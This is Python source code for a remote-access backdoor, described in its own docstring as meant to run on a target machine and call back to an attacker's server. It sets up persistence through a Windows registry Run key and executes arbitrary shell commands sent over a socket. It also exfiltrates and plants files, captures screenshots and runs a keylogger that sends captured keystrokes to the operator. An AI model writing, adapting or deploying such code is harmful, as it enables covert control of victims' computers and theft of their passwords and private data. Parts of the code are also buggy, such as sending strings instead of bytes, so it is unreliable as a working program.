# -*- Coding : utf-8 -*-

"""
    Backdoor to execute on target machine.
    Connect to the server running on attacker machine.
"""

import socket, subprocess, os, sys, threading, shutil, time
import pyautogui
import keylogger

def persist():
    file_location = os.environ["appdata"] + "\\WindowsBackdoor.exe"
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(f"reg add HkCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d '{file_location}'", shell=True)
            s.send("[+] Successfully created persistence.")
        else:
            s.send("[!] Persistence already exists.")
    except:
        s.send("[-] Unable to create persistence.")

def download_file(filename):
    with open(filename, "wb") as file:
        chunk = s.recv(1024)
        while chunk:
            file.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout:
                break

def upload_file(filename):
    with open(filename, "rb") as file:
        s.send(file.read())

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode()
            return data
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command == "help":
            pass
        elif command == "clear":
            pass

        elif command[:2] == "cd":
            os.chdir(command[3:])

        elif command[:6] == "upload":
            download_file(command[7:])

        elif command[:8] == "download":
            upload_file(command[9:])

        elif command[:10] == "screenshot":
            screenshot()
            upload_file("screenshot.png")
            os.remove("screenshot.png")

        elif command[:12] == "keylog start":
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            s.send("[+] Keylogger started")

        elif command[:11] == "keylog dump":
            logs = keylog.read_logs()
            s.send(logs)

        elif command[:11] == "keylog stop":
            keylogger.self_destruct()
            t.join()
            s.send("[+] Keylogger stopped")

        elif command == "persistence":
            persist()

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            s.send(result)  # result contain bytes, so no need to encode it

    s.close()

def connection():
    while True:
        time.sleep(10)
        try:
            s.connect(("127.0.0.1", 65319))
            shell()
            break
        except:
            connection()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()



